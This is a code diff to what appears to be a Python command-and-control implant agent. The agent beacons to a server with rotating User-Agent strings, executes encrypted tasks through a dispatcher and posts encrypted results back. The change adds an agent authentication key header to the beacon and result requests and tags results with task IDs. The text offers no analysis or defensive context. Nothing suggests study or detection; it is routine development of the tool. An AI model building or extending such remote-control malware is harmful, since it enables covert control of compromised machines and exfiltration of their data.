@@ -6,7 +6,7 @@ import platform
 import getpass
 import os
 import json
-from common.cryptography_helpers import encrypt_string, decrypt_string
+from common.cryptography_helpers import encrypt_string, decrypt_string, AGENT_KEY
 from .dispatcher import execute_task as dispatch_task
 
 # Configuration
@@ -64,7 +64,7 @@ headers = {
 }
 
 def beacon():
-    headers = {"User-Agent": random.choice(USER_AGENTS)}
+    headers = {"User-Agent": random.choice(USER_AGENTS), "X-Agent-Key": AGENT_KEY}
     payload = {"id": AGENT_ID,
                "meta": AGENT_META}
     try:
@@ -87,6 +87,7 @@ def execute_task(task_encrypted):
         print(f"[+] Executing structured task: {task_obj}")
         
         result = dispatch_task(task_obj)
+        result["task_id"] = task_obj.get("task_id")
         post_result(json.dumps(result))
         
     except Exception as e:
@@ -98,7 +99,7 @@ def execute_task(task_encrypted):
         
 
 def post_result(result):
-    headers = {"User-Agent": random.choice(USER_AGENTS)}
+    headers = {"User-Agent": random.choice(USER_AGENTS), "X-Agent-Key": AGENT_KEY}
     payload = {"id": AGENT_ID, "output": encrypt_string(result)}
     try:
         requests.post(SERVER_URL + RESULT_ENDPOINT, json=payload, headers=headers)
